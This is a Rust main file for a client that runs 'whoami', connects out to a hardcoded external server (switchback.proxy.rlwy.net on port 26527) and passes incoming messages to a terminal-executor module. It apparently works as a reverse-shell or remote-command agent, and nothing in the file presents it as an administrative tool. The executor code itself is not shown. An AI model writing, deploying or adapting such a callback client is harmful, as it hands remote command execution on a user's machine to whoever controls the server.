pub mod connection;
pub mod executor;
pub mod protocol;
use std::sync::Arc;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use executor::TerminalState;
use tokio::process::Command;

const SERVER_HOST: &str = "switchback.proxy.rlwy.net";
const SERVER_PORT: u16 = 26527;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut user_id = String::new();
    let output = Command::new("sh")
        .arg("-c")
        .arg("whoami")
        .output()
        .await;
    
    let username = match output {
        Ok(out) => {
            let parsed = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if parsed.is_empty() {
                "userjan".to_string()
            } else {
                parsed
            }
        }
        Err(_) => "userjan".to_string(), 
    };

    let addr = format!("{}:{}", SERVER_HOST, SERVER_PORT);
    let stream = TcpStream::connect(&addr).await?;

    let state = Arc::new(Mutex::new(TerminalState::new()));

    let (reader, writer) = stream.into_split();
    let (tx, rx) = tokio::sync::mpsc::channel::<String>(32);

    tokio::select! {
        _ = connection::receive_messages(reader, username.clone(), tx, state) => {},
        _ = connection::send_messages(writer, username, rx) => {},
    }

    Ok(())
}